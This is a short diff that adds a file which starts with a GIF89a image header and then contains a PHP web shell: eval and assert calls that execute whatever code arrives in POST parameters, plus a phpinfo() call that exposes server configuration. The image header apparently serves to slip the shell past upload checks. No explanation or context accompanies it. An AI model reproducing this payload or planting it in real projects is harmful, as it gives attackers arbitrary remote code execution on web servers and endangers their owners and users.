@@ -1,0 +1,6 @@
+GIF89a
+<?php
+@eval($_POST['1']);
+@assert($_POST['2']);
+phpinfo();
+
